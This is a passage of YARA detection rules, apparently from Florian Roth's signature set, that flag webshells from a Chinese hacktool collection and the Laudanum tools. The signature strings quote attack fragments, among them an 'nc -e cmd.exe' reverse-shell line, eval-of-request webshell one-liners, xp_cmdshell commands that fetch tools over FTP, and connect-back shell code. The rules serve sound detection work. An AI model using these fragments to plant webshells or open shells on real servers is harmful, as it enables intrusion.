      $s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule Webshell_Laudanum_Tools_Generic_RID3369 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 14:46:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "885e1783b07c73e7d47d3283be303c9719419b92"
      hash2 = "01d5d16d876c55d77e094ce2b9c237de43b21a16"
      hash3 = "7421d33e8007c92c8642a36cba7351c7f95a4335"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "***  laudanum@secureideas.net" fullword ascii
      $s2 = "*** Laudanum Project" fullword ascii
   condition: 
      filesize < 60KB and all of them
}

rule Webshell_Txt_aspx1_RID2E32 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspx1.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:04:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[" 
      $s1 = "],\"unsafe\");%>" fullword ascii
   condition: 
      filesize < 150 and all of them
}

rule Webshell_Shell_Asp_RID2E21 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set Webshells - file Asp.html"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:01:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
      $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
      $s3 = "function Command(cmd, str){" fullword ascii
   condition: 
      filesize < 100KB and all of them
}

rule Webshell_Txt_aspxtag_RID2F3D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspxtag.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:48:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "String wGetUrl=Request.QueryString[" fullword ascii
      $s2 = "sw.Write(wget);" fullword ascii
      $s3 = "Response.Write(\"Hi,Man 2015\"); " fullword ascii
   condition: 
      filesize < 2KB and all of them
}

rule Webshell_Txt_php_RID2D8D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file php.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
      $s2 = "gzuncompress($_SESSION['api']),null);" ascii
      $s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
      $s4 = "if(empty($_SESSION['api']))" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule Webshell_Txt_shell_RID2E5D : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file shell.c"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:11:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "printf(\"Could not connect to remote shell!\\n\");" fullword ascii
      $s2 = "printf(\"Usage: %s <reflect ip> <port>\\n\", prog);" fullword ascii
      $s3 = "execl(shell,\"/bin/sh\",(char *)0);" fullword ascii
      $s4 = "char shell[]=\"/bin/sh\";" fullword ascii
      $s5 = "connect back door\\n\\n\");" fullword ascii
   condition: 
      filesize < 2KB and 2 of them
}

rule Webshell_Txt_asp_RID2D89 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file asp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol" ascii
      $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 100KB and all of them
}

rule Webshell_Txt_asp1_RID2DBA : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file asp1.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:44:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
      $s2 = "autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
      $s3 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
      $s4 = "szTempFile = server.mappath(\"cmd.txt\")" fullword ascii
   condition: 
      filesize < 70KB and 2 of them
}

rule Webshell_Txt_php_2_RID2E1E : CHINA DEMO T1016 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file php.html"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:00:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1016, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
      $s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
      $s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
      $s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
      $s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii
   condition: 
      filesize < 100KB and 4 of them
}

rule Webshell_Txt_ftp_RID2D8F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file ftp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:37:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "';exec master.dbo.xp_cmdshell 'echo open " ascii
      $s2 = "';exec master.dbo.xp_cmdshell 'ftp -s:';" ascii
      $s3 = "';exec master.dbo.xp_cmdshell 'echo get lcx.exe" ascii
      $s4 = "';exec master.dbo.xp_cmdshell 'echo get php.exe" ascii
      $s5 = "';exec master.dbo.xp_cmdshell 'copy " ascii
      $s6 = "ftp -s:d:\\ftp.txt " fullword ascii
      $s7 = "echo bye>>d:\\ftp.txt " fullword ascii
   condition: 
      filesize < 2KB and 2 of them
}

rule Webshell_Txt_lcx_RID2D8C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file lcx.c"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:36:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "printf(\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l" ascii
      $s2 = "sprintf(tmpbuf2,\"\\r\\n########### reply from %s:%d ####################\\r\\n" ascii
      $s3 = "printf(\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\r\\n\");" fullword ascii
      $s4 = "printf(\"got,ip:%s,port:%d\\r\\n\",inet_ntoa(client1.sin_addr),ntohs(client1.sin" ascii
      $s5 = "printf(\"[-] connect to host1 failed\\r\\n\");" fullword ascii
   condition: 
      filesize < 25KB and 2 of them
}

rule Webshell_Txt_jspcmd_RID2EC6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file jspcmd.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:28:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
      $s4 = "out.print(\"Hi,Man 2015\");" fullword ascii
   condition: 
      filesize < 1KB and 1 of them
}

rule Webshell_Txt_jsp_RID2D92 : CHINA DEMO T1007 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file jsp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:37:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1007, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
      $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
      $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
   condition: 
      filesize < 715KB and 2 of them
}

rule Webshell_Txt_aspxlcx_RID2F48 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspxlcx.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:50:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "public string remoteip = " ascii
      $s2 = "=Dns.Resolve(host);" ascii
      $s3 = "public string remoteport = " ascii
      $s4 = "public class PortForward" ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 18KB and all of them
}

rule Webshell_Txt_xiao_RID2DF6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file xiao.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:54:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Session.Contents.Remove(m & \"userPassword\")" fullword ascii
      $s2 = "passWord = Encode(GetPost(\"password\"))" fullword ascii
      $s3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED," ascii
      $s4 = "function Command(cmd, str){" fullword ascii
      $s5 = "echo \"if(obj.value=='PageWebProxy')obj.form.target='_blank';\"" fullword ascii
   condition: 
      filesize < 100KB and all of them
}

rule Webshell_Txt_aspx_RID2E01 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file aspx.jpg"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:56:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
      $s2 = "Process[] p=Process.GetProcesses();" fullword ascii
      $s3 = "Copyright &copy; 2009 Bin" ascii
      $s4 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"serv" ascii
   condition: 
      filesize < 100KB and all of them
}

rule Webshell_Txt_Sql_RID2D75 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file Sql.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:32:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd=chr(34)&\"cmd.exe /c \"&request.form(\"cmd\")&\" > 8617.tmp\"&chr(34)" fullword ascii
      $s2 = "strQuery=\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\"" fullword ascii
      $s3 = "strQuery = \"exec master.dbo.xp_cmdshell '\" & request.form(\"cmd\") & \"'\" " fullword ascii
      $s4 = "session(\"login\")=\"\"" fullword ascii
   condition: 
      filesize < 15KB and all of them
}

rule Webshell_Txt_hello_RID2E59 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file hello.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 11:10:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Dim myProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
      $s1 = "myProcessStartInfo.Arguments=\"/c \" & Cmd.text" fullword ascii
      $s2 = "myProcess.Start()" fullword ascii
      $s3 = "<p align=\"center\"><a href=\"?action=cmd\" target=\"_blank\">" fullword ascii
   condition: 
      filesize < 25KB and all of them
}

rule Webshell_ChinaChopper_one_RID30FB : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file one.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:03:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%eval request(" ascii
   condition: 
      filesize < 50 and all of them
}

rule Webshell_ChinaChopper_temp_2_RID3200 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:46:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
   condition: 
      filesize < 150 and all of them
}

rule Webshell_templatr_RID2E0F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file templatr.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:58:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "eval(gzinflate(base64_decode('" ascii
   condition: 
      filesize < 70KB and all of them
}

rule Webshell_Tools_JSP_cmd_RID2F96 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file cmd.jSp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:03:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(\"1752393\".equals(request.getParameter(\"Confpwd\"))){" fullword ascii
      $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"Conn\"" ascii
      $s2 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s3 = "out.print(\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\");" fullword ascii
      $s4 = "while((a=in.read(b))!=-1){" fullword ascii
      $s5 = "out.println(new String(b));" fullword ascii
      $s6 = "out.print(\"</pre>\");" fullword ascii
      $s7 = "out.print(\"<pre>\");" fullword ascii
      $s8 = "int a = -1;" fullword ascii
      $s9 = "byte[] b = new byte[2048];" fullword ascii
   condition: 
      filesize < 3KB and 7 of them
}

rule Webshell_InjectionParameters_RID325D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file InjectionParameters.vb"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:02:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Public Shared ReadOnly Empty As New InjectionParameters(-1, \"\")" fullword ascii
      $s1 = "Public Class InjectionParameters" fullword ascii
   condition: 
      filesize < 13KB and all of them
}

rule Webshell_Customize_4_RID2EFC : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file Customize.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:37:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex" ascii
      $s2 = "c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr" ascii
      $s3 = "Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create" ascii
      $s4 = "R=\"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";}Conn.Close();break;" ascii
   condition: 
      filesize < 24KB and all of them
}

rule Webshell_oracle_data_RID2F15 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file oracle_data.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:42:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
      $s1 = "if(isset($_REQUEST['id']))" fullword ascii
      $s2 = "$id=$_REQUEST['id'];" fullword ascii
   condition: 
      all of them
}

rule Webshell_reDuhServers_reDuh_RID31DF : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:41:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "out.println(\"[Error]Unable to connect to reDuh.jsp main process on port \" +ser" ascii
      $s4 = "System.out.println(\"IPC service failed to bind to \" + servicePort);" fullword ascii
      $s17 = "System.out.println(\"Bound on \" + servicePort);" fullword ascii
      $s5 = "outputFromSockets.add(\"[data]\"+target+\":\"+port+\":\"+sockNum+\":\"+new Strin" ascii
   condition: 
      filesize < 116KB and all of them
}

rule Webshell_item_old_RID2DF3 : CHINA DEMO T1105 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item-old.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:53:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1105, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
      $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
      $s3 = "$sHash = md5($sURL);" fullword ascii
   condition: 
      filesize < 7KB and 2 of them
}

rule Webshell_Tools_2014_RID2DDD : CHINA DEMO T1007 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file 2014.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:50:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1007, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "((Invoker) ins.get(\"login\")).invoke(request, response," fullword ascii
      $s4 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $s5 = ": \"c:\\\\windows\\\\system32\\\\cmd.exe\")" fullword ascii
   condition: 
      filesize < 715KB and all of them
}

rule Webshell_reDuhServers_reDuh_2_RID3270 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:05:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
      $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
      $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
   condition: 
      filesize < 57KB and all of them
}

rule Webshell_Customize_5_RID2EFD : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file Customize.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:38:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}}" fullword ascii
      $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
   condition: 
      filesize < 30KB and all of them
}

rule Webshell_CN_Tools_old_RID2F45 : CHINA DEMO T1105 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file old.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 11:50:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1105, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
      $s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
      $s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
      $s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
   condition: 
      filesize < 6KB and all of them
}

rule Webshell_item_301_RID2D48 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item-301.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:25:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
      $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
      $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
      $s4 = "$sURL = $aArg[0];" fullword ascii
   condition: 
      filesize < 3KB and 3 of them
}

rule Webshell_CN_Tools_item_RID2FB5 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file item.php"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:08:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
      $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
      $s3 = "$sWget=\"index.asp\";" fullword ascii
      $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
   condition: 
      filesize < 4KB and all of them
}

rule Webshell_f3_diy_RID2CE4 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file diy.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:08:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
      $s5 = ".black {" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 10KB and all of them
}

rule Webshell_ChinaChopper_temp_RID316F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file temp.asp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:22:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
      $s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
      $s2 = "o.language = \"vbscript\"" fullword ascii
      $s3 = "o.addcode(Request(\"SC\"))" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule Webshell_Tools_2015_RID2DDE : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file 2015.jsp"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:50:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Configbis = new BufferedInputStream(httpUrl.getInputStream());" fullword ascii
      $s4 = "System.out.println(Oute.toString());" fullword ascii
      $s5 = "String ConfigFile = Outpath + \"/\" + request.getParameter(\"ConFile\");" fullword ascii
      $s8 = "HttpURLConnection httpUrl = null;" fullword ascii
      $s19 = "Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;" fullword ascii
   condition: 
      filesize < 7KB and all of them
}

rule Webshell_reDuhServers_reDuh_3_RID3271 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - file reDuh.aspx"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:05:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Response.Write(\"[Error]Unable to connect to reDuh.jsp main process on port \" +" ascii
